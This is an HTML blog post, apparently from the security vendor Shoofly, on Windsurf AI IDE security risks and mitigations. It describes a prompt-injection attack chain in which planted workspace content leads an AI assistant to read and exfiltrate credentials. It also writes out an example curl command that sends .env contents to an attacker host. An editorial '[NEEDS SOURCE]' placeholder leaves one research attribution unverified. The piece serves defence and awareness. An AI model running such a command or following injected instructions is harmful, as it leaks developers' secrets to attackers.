@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Windsurf has gone from "interesting alternative" to one of the most popular AI-powered IDEs in production. Developers love it. Teams are adopting it org-wide..." />
+  <meta name="color-scheme" content="dark" />
+  <meta property="og:title" content="Windsurf Security: The Risks Nobody's Talking About — Shoofly" />
+  <meta property="og:description" content="Windsurf has gone from "interesting alternative" to one of the most popular AI-powered IDEs in production. Developers love it. Teams are adopting it org-wide..." />
+  <meta property="og:image" content="https://shoofly.dev/social-card.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://shoofly.dev/blog/windsurf-security/" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Windsurf Security: The Risks Nobody's Talking About — Shoofly" />
+  <meta name="twitter:description" content="Windsurf has gone from "interesting alternative" to one of the most popular AI-powered IDEs in production. Developers love it. Teams are adopting it org-wide..." />
+  <meta name="twitter:image" content="https://shoofly.dev/social-card.png" />
+  <title>Windsurf Security: The Risks Nobody's Talking About — Shoofly</title>
+  <link rel="canonical" href="https://shoofly.dev/blog/windsurf-security/" />
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <link rel="shortcut icon" href="/favicon.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {--bg:#0d1117;--bg-alt:#161b22;--border:#30363d;--text:#e6edf3;--text-muted:#8b949e;--accent:#16a34a;--accent-dim:#16a34a33;--font-body:'Inter',system-ui,sans-serif;--font-mono:'JetBrains Mono',monospace;}
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}html{scroll-behavior:smooth;}
+    body{background-color:var(--bg);color:var(--text);font-family:var(--font-body);font-size:1rem;line-height:1.7;-webkit-font-smoothing:antialiased;padding-top:56px;}
+    a{color:var(--accent);text-decoration:none;}a:hover{text-decoration:underline;}
+    .site-nav{position:fixed;top:0;left:0;right:0;z-index:100;background-color:var(--bg-alt);border-bottom:1px solid var(--border);height:56px;padding:0 1.5rem;display:flex;justify-content:space-between;align-items:center;}
+    .nav-logo{font-size:1.1rem;font-weight:700;color:var(--accent);text-decoration:none;letter-spacing:-0.01em;white-space:nowrap;}
+    .nav-logo:hover{text-decoration:none;}
+    .nav-hamburger{display:none;flex-direction:column;justify-content:space-between;width:24px;height:18px;background:none;border:none;cursor:pointer;padding:0;}
+    .nav-hamburger span{display:block;height:2px;background:var(--text);border-radius:2px;}
+    .nav-links{display:flex;list-style:none;gap:1.5rem;align-items:center;}
+    .nav-links a{font-size:0.9rem;font-weight:500;color:var(--text-muted);text-decoration:none;transition:color 0.15s;}
+    .nav-links a:hover{color:var(--text);}
+    @media(max-width:768px){.nav-hamburger{display:flex;}.nav-links{display:none;position:absolute;top:56px;left:0;right:0;background:var(--bg-alt);border-bottom:1px solid var(--border);flex-direction:column;padding:1rem 1.5rem;gap:1rem;}.nav-links.open{display:flex;}}
+    .container{width:100%;max-width:720px;margin:0 auto;padding:0 1.5rem;}
+    .post-header{padding:3.5rem 0 2rem;border-bottom:1px solid var(--border);}
+    .post-meta{display:flex;gap:1rem;align-items:center;margin-bottom:1rem;}
+    .post-date{font-size:0.85rem;color:var(--text-muted);}
+    .post-tag{background:var(--accent-dim);color:var(--accent);padding:0.15rem 0.5rem;border-radius:4px;font-size:0.75rem;font-weight:500;}
+    .post-header h1{font-size:clamp(1.75rem,5vw,2.5rem);font-weight:700;letter-spacing:-0.02em;line-height:1.2;}
+    .post-body{padding:2.5rem 0 4rem;}
+    .post-body p{margin-bottom:1.4rem;color:var(--text);font-size:1.05rem;}
+    .post-body h2{font-size:1.3rem;font-weight:700;margin:2.5rem 0 1rem;color:var(--text);letter-spacing:-0.01em;}
+    .post-body h3{font-size:1.1rem;font-weight:700;margin:2rem 0 0.75rem;color:var(--text);}
+    .post-body ul,.post-body ol{margin:1rem 0 1.4rem 1.5rem;}
+    .post-body li{margin-bottom:0.4rem;font-size:1.05rem;}
+    .post-body code{font-family:var(--font-mono);font-size:0.88em;background:var(--bg-alt);border:1px solid var(--border);padding:0.15em 0.4em;border-radius:3px;}
+    .post-body pre{background:var(--bg-alt);border:1px solid var(--border);border-radius:6px;padding:1.25rem 1.5rem;margin:1.5rem 0;overflow-x:auto;}
+    .post-body pre code{background:none;border:none;padding:0;font-size:0.9rem;}
+    .post-body hr{border:none;border-top:1px solid var(--border);margin:2rem 0;}
+    .post-body strong{color:var(--text);font-weight:600;}
+    .post-body a{color:var(--accent);font-weight:600;}
+    .post-body table{width:100%;border-collapse:collapse;margin:1.5rem 0;font-size:0.9rem;}
+    .post-body th{background:var(--bg-alt);border:1px solid var(--border);padding:0.6rem 1rem;text-align:left;font-weight:600;}
+    .post-body td{border:1px solid var(--border);padding:0.6rem 1rem;}
+    .post-body tr:nth-child(even) td{background:var(--bg-alt);}
+    .back-link{display:inline-block;margin-bottom:2rem;font-size:0.9rem;color:var(--text-muted);}
+    .back-link:hover{color:var(--accent);}
+    .cta-box{background:var(--bg-alt);border:1px solid var(--border);border-radius:8px;padding:1.5rem 2rem;margin:2rem 0;}
+    .footer{border-top:1px solid var(--border);padding:2rem 0;margin-top:2rem;}
+    .footer-inner{display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:1rem;}
+    .footer-copy{color:var(--text-muted);font-size:0.875rem;}
+    .footer-link{font-size:0.875rem;color:var(--text-muted);text-decoration:none;}.footer-link:hover{color:var(--accent);}
+    .footer-links{display:flex;gap:1.5rem;flex-wrap:wrap;}
+  </style>
+  <link rel="sitemap" type="application/xml" href="/sitemap.xml">
+  <link rel="alternate" type="application/rss+xml" title="Shoofly Blog" href="/feed.xml">
+</head>
+<body>
+  <nav class='site-nav'>
+    <a href='/' class='nav-logo'>🪰 Shoofly</a>
+    <button class='nav-hamburger' id='navHamburger' aria-label='Open menu'><span></span><span></span><span></span></button>
+    <ul class='nav-links' id='navLinks'>
+      <li><a href='/#pricing'>Shoofly Basic</a></li>
+      <li><a href='/#pricing-advanced'>Shoofly Advanced</a></li>
+      <li><a href='/claude-code-dispatch'>Claude Code FAQs</a></li>
+      <li><a href='/openclaw'>OpenClaw FAQs</a></li>
+      <li><a href='/blog'>Blog</a></li>
+      <li><a href='https://clawhub.ai/wow-leeroy-jenkins05/shoofly-basic' target='_blank' rel='noopener noreferrer'>ClawHub</a></li>
+      <li><a href='https://github.com/shoofly-dev/shoofly' target='_blank' rel='noopener noreferrer'>GitHub</a></li>
+    </ul>
+  </nav>
+  <div class="container">
+    <div class="post-header">
+      <div class="post-meta">
+        <time class="post-date" datetime="2026-03-13">March 13, 2026</time>
+        <span class="post-tag">Security</span>
+      </div>
+      <h1>Windsurf Security: The Risks Nobody's Talking About</h1>
+    </div>
+    <main class="post-body">
+      <a href="/blog" class="back-link">&larr; Back to Blog</a>
+<p>Windsurf has gone from "interesting alternative" to one of the most popular AI-powered IDEs in production. Developers love it. Teams are adopting it org-wide. And almost nobody is talking about its security model.</p>
+
+<p>This isn't an anti-Windsurf piece. Windsurf is a genuinely good product, and the team behind it has built real engineering value. But "good product" and "secure product" aren't the same thing — and right now, there's a near-total gap in public security analysis for an IDE that has deep access to codebases, terminals, file systems, and network resources across thousands of organizations.</p>
+
+<p>Here's what we found.</p>
+
+<h2>Windsurf's Access Model</h2>
+
+<p>Like all AI-powered IDEs, Windsurf needs access to your environment to be useful. Here's what it can reach:</p>
+
+<p><strong>File system.</strong> Windsurf reads and writes files across your project — and, depending on configuration, potentially beyond it. The AI assistant needs file access to understand your codebase, generate code, and apply edits. This access extends to any file the IDE process can reach, including configuration files, credential stores, and dotfiles.</p>
+
+<p><strong>Terminal.</strong> Windsurf can execute terminal commands. This is how it runs builds, installs dependencies, and executes tests. Terminal access means arbitrary shell command execution with the same permissions as your user account.</p>
+
+<p><strong>Network.</strong> Windsurf communicates with external services — its own AI backend, package registries, documentation servers, and any API endpoint a user or the AI assistant targets. Network access means data can flow out of your environment.</p>
+
+<p><strong>Extensions.</strong> Like all VS Code-derived editors, Windsurf supports extensions that can access the full IDE API, including file system, terminal, and network capabilities.</p>
+
+<p><strong>Environment variables.</strong> The IDE process inherits your shell environment, which typically includes API keys, cloud credentials, database connection strings, and other secrets.</p>
+
+<p>The access model is essentially the same as any other AI-powered IDE built on the VS Code / Electron stack. The difference isn't what Windsurf *can* access — it's what controls exist to govern that access.</p>
+
+<h3>What's Missing</h3>
+
+<p>Windsurf does not currently provide:</p>
+
+<ul>
+<li><strong>Pre-execution tool call policy.</strong> There's no mechanism to define rules like "block shell commands matching this pattern" or "prevent file reads outside this directory tree."</li>
+<li><strong>Centralized security configuration.</strong> No org-wide policy management for teams deploying Windsurf across multiple developers.</li>
+<li><strong>Credential-sniffing detection.</strong> No built-in detection for AI actions that access or transmit credential-bearing files or environment variables.</li>
+<li><strong>Tool call audit logging.</strong> No centralized log of what the AI assistant executed, when, and with what arguments.</li>
+</ul>
+
+<p>These aren't criticisms of Windsurf specifically — most AI IDEs lack these controls. But Windsurf's adoption scale makes the gap matter more.</p>
+
+<h2>Data Exfiltration: The EmbraceTHeRed Research</h2>
+
+<p>Security researcher EmbraceTHeRed published research demonstrating data exfiltration vulnerabilities in AI-powered coding assistants, including analysis applicable to Windsurf's architecture. [NEEDS SOURCE — verify the specific EmbraceTHeRed research, publication date, and which products were tested. If Windsurf was not directly tested, state that the findings apply to architecturally similar products and name which were directly tested.]</p>
+
+<p>The core finding: AI coding assistants can be manipulated via prompt injection to exfiltrate sensitive data from the developer's environment. The attack chain:</p>
+
+<ol>
+<li><strong>Injection.</strong> Adversarial instructions are embedded in content the AI assistant processes — a cloned repository's README, a fetched web page, a code comment, or a dependency's documentation.</li>
+</ol>
+
+<ol>
+<li><strong>Data access.</strong> The injected instructions direct the AI to read sensitive files — <code>.env</code> files, SSH keys, API tokens, cloud credentials — using the file access the IDE requires for normal operation.</li>
+</ol>
+
+<ol>
+<li><strong>Exfiltration.</strong> The AI transmits the sensitive data to an attacker-controlled endpoint, either through direct network requests or by encoding the data in seemingly benign actions (image URLs, markdown rendering, API calls).</li>
+</ol>
+
+<p>The research demonstrated that these attacks work without any visible indication to the developer. The AI assistant appears to be functioning normally while exfiltrating credentials in the background.</p>
+
+<p>This isn't a bug in Windsurf's code. It's a consequence of giving an AI assistant broad environment access without pre-execution controls on what it does with that access. Every AI IDE with similar access patterns faces the same risk.</p>
+
+<h2>The Chromium CVE Surface</h2>
+
+<p>Windsurf, like Cursor, Zed's AI features, and most modern AI-powered IDEs, is built on Electron — which is built on Chromium. This matters for security.</p>
+
+<p>OX Security published research identifying 94 Chromium CVEs applicable to Electron-based development tools. These aren't theoretical — they're known vulnerabilities in the rendering engine, V8 JavaScript engine, and process model that Electron inherits from Chromium.</p>
+
+<p>The key findings:</p>
+
+<p><strong>Shared attack surface.</strong> Every Electron-based IDE shares the same Chromium vulnerability surface. A Chromium CVE that affects Chrome affects Electron, which affects every IDE built on it. Windsurf, Cursor, and other Electron-based AI IDEs all inherit this surface.</p>
+
+<p><strong>Patch lag.</strong> Electron doesn't always ship Chromium updates immediately. There's a window between when a Chromium CVE is published and when the Electron version used by a specific IDE is patched. During this window, the IDE is running a known-vulnerable browser engine with access to your file system, terminal, and credentials.</p>
+
+<p><strong>Extension attack surface.</strong> Electron's process model means extensions run with significant privileges. A malicious extension in an Electron-based IDE has access that goes well beyond what a browser extension can reach — file system, shell execution, network, and the AI assistant's tool calling capabilities.</p>
+
+<p><strong>94 CVEs, and counting.</strong> OX Security's count of 94 applicable Chromium CVEs represents the known surface as of their research date. New Chromium CVEs are published regularly, and the applicable count continues to grow.</p>
+
+<p>This is not unique to Windsurf. It's a structural property of all Electron-based AI IDEs. But it's a risk that Windsurf users should understand, especially in environments with strict security requirements.</p>
+
+<h2>What Windsurf Doesn't Protect Against</h2>
+
+<p>Based on publicly available documentation and our analysis, here are the specific gaps in Windsurf's security posture:</p>
+
+<h3>Prompt Injection via Workspace Content</h3>
+
+<p>Windsurf's AI assistant reads files in your workspace to understand context. If any of those files contain prompt injection payloads — a cloned repo with adversarial content, a dependency with a malicious README, a fetched document with hidden instructions — the assistant may follow those instructions.</p>
+
+<p>Windsurf does not currently publish documentation on prompt injection defenses or scanning mechanisms for workspace content.</p>
+
+<h3>Uncontrolled Shell Execution</h3>
+
+<p>When the AI assistant executes shell commands, there's no published policy layer between the assistant's decision to run a command and the command's execution. If the assistant is manipulated into running <code>curl attacker.com/exfil?data=$(cat .env)</code>, there's no interception point to block it.</p>
+
+<h3>Extension Supply Chain</h3>
+
+<p>Windsurf inherits the VS Code extension ecosystem. Extensions have broad API access and can interact with the AI assistant's capabilities. A malicious or compromised extension can:</p>
+
+<ul>
+<li>Read any file the IDE can access</li>
+<li>Execute shell commands</li>
+<li>Make network requests</li>
+<li>Intercept or modify the AI assistant's actions</li>
+</ul>
+
+<h3>Network Egress</h3>
+
+<p>There's no published mechanism for restricting which network destinations Windsurf's AI assistant can communicate with. All outbound requests from the IDE process — whether to Windsurf's backend, legitimate APIs, or attacker-controlled endpoints — flow through the same unrestricted channel.</p>
+
+<h3>Cross-Session Data Persistence</h3>
+
+<p>AI IDE sessions accumulate context — file contents, command outputs, conversation history. If this context persists across sessions or is synchronized to cloud services, the attack surface extends beyond the current session.</p>
+
+<h2>Concrete Mitigations</h2>
+
+<p>If you're using Windsurf in production, here's what you can do today:</p>
+
+<h3>1. Network Monitoring</h3>
+
+<p>Monitor outbound network traffic from the Windsurf process. Look for:</p>
+
+<ul>
+<li>Requests to unfamiliar domains</li>
+<li>Data volumes that don't match normal IDE usage</li>
+<li>Encoded payloads in URL parameters or request bodies</li>
+<li>Connections to cloud metadata endpoints (169.254.169.254, metadata.google.internal)</li>
+</ul>
+
+<p>Tools: Little Snitch (macOS), Wireshark, tcpdump, or your network security stack.</p>
+
+<h3>2. File Access Restrictions</h3>
+
+<p>Limit what the Windsurf process can reach:</p>
+
+<ul>
+<li>Run Windsurf in a container or VM with only the project directory mounted</li>
+<li>Use OS-level file permissions to prevent access to credential stores</li>
+<li>Move <code>.env</code> files and SSH keys outside the IDE's reachable path where possible</li>
+<li>Consider using a secrets manager instead of filesystem-stored credentials</li>
+</ul>
+
+<h3>3. Extension Vetting</h3>
+
+<p>Audit every extension before installation:</p>
+
+<ul>
+<li>Check the publisher's identity and history</li>
+<li>Review the extension's permissions (what APIs it requests)</li>
+<li>Prefer extensions with open and auditable source code</li>
+<li>Limit the number of installed extensions to reduce attack surface</li>
+<li>Monitor extension updates — a compromised update can weaponize a previously safe extension</li>
+</ul>
+
+<h3>4. Environment Isolation</h3>
+
+<p>Don't give Windsurf access to production credentials:</p>
+
+<ul>
+<li>Use separate credential sets for development and production</li>
+<li>Don't store production API keys in environment variables on your dev machine</li>
+<li>Use credential vaulting solutions that require explicit authentication per session</li>
+</ul>
+
+<h3>5. Pre-Execution Policy Enforcement</h3>
+
+<p>Add a security layer that evaluates tool calls before they execute. This addresses the root gap — the space between "the AI decided to do something" and "the thing happened."</p>
+
+<p>Policy rules can:</p>
+
+<ul>
+<li>Block shell commands matching dangerous patterns</li>
+<li>Prevent file reads outside the project directory</li>
+<li>Restrict network requests to approved domains</li>
+<li>Detect credential access patterns</li>
+</ul>
+
+<p>Shoofly Advanced provides pre-execution policy enforcement that works across AI agent runtimes, including IDE-based agents. The same policy rules — file path restrictions, shell command patterns, network egress controls, credential-sniffing detection — apply regardless of which AI IDE is making the tool call. The hook intercepts at the dispatch layer, before execution.</p>
+
+<p>For more on how pre-execution security works across different AI agent environments, see our guides on <a href="/blog/ai-computer-use-security-attack-vectors/">AI computer use security</a> and <a href="/blog/prompt-injection-blocking-pre-execution-security/">prompt injection blocking</a>.</p>
+
+<h2>The Bottom Line</h2>
+
+<p>Windsurf is a capable AI IDE. It's not uniquely insecure — the gaps described here apply to most AI-powered development tools. But Windsurf's rapid adoption means these gaps affect a growing number of developers and organizations.</p>
+
+<p>The security model for AI IDEs hasn't caught up with the access model. These tools have deep environment access — files, terminal, network, credentials — and minimal controls on what the AI assistant does with that access.</p>
+
+<p>Windsurf doesn't have built-in tool call security. Shoofly Advanced adds it.</p>
+
+<p><strong>→ <a href="https://shoofly.dev/advanced">Add pre-execution security to your AI IDE</a></strong></p>
+
+<hr>
+
+<h2>FAQ</h2>
+
+<h3>Is Windsurf safe to use?</h3>
+
+<p>Windsurf is a well-engineered AI IDE, but like all AI coding assistants, it has security considerations that users should understand. It has broad access to your file system, terminal, network, and environment variables — all of which are necessary for its functionality but create risk if the AI assistant is manipulated via prompt injection. Adding pre-execution policy enforcement and following the mitigations in this guide significantly reduces the risk.</p>
+
+<h3>What are the security risks of AI-powered IDEs?</h3>
+
+<p>AI-powered IDEs face several security risks: prompt injection via workspace content (malicious files directing the AI to perform harmful actions), data exfiltration (AI transmitting sensitive data to external endpoints), uncontrolled shell execution (AI running dangerous commands), extension supply chain attacks (malicious extensions with broad access), and the shared Chromium vulnerability surface (94+ CVEs applicable to Electron-based IDEs). These risks stem from the combination of broad environment access and AI decision-making without pre-execution controls.</p>
+
+<h3>How do I protect my credentials from AI coding assistants?</h3>
+
+<p>Move credentials out of the AI's reachable path: use a secrets manager instead of <code>.env</code> files, don't store production keys in shell environment variables on your dev machine, separate development and production credentials, and run your AI IDE in an isolated environment with only the project directory accessible. Additionally, deploy pre-execution policy rules that detect and block credential access patterns — flagging any AI action that reads <code>.env</code>, <code>.ssh</code>, or credential-bearing files.</p>
+
+<h3>Does Windsurf have a security vulnerability?</h3>
+
+<p>This analysis doesn't identify specific vulnerabilities in Windsurf's code. It identifies architectural gaps common to AI-powered IDEs: the absence of pre-execution tool call policy, the Electron/Chromium CVE surface shared by all Electron-based IDEs, and the lack of credential-sniffing detection. These are design gaps, not bugs — and they apply broadly to the AI IDE category, not uniquely to Windsurf.</p>
+      <hr>
+      <div class="cta-box">
+        <p><strong>Ready to secure your AI agents?</strong> <a href="https://shoofly.dev/advanced">Shoofly Advanced</a> provides pre-execution policy enforcement for Claude Code and OpenClaw — 20 threat rules, YAML policy-as-code, 100% local. $5/mo.</p>
+      </div>
+    </main>
+  </div>
+  <footer class="footer">
+    <div class="container footer-inner">
+      <span class="footer-copy">&copy; 2026 Shoofly</span>
+      <div class="footer-links">
+        <a href="https://github.com/shoofly-dev/shoofly" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub</a>
+        <a href="/openclaw" class="footer-link">OpenClaw</a>
+        <a href="/claude-code-dispatch" class="footer-link">Claude Code</a>
+        <a href="/guides" class="footer-link">Guides</a>
+        <a href="/blog" class="footer-link">Blog</a>
+        <a href="/docs/advanced" class="footer-link">Shoofly Advanced Docs</a>
+        <a href="mailto:support@shoofly.dev" class="footer-link">support@shoofly.dev</a>
+      </div>
+    </div>
+  </footer>
+  <script>
+    const h=document.getElementById('navHamburger'),n=document.getElementById('navLinks');
+    if(h)h.addEventListener('click',()=>n.classList.toggle('open'));
+  </script>
+</body>
+</html>
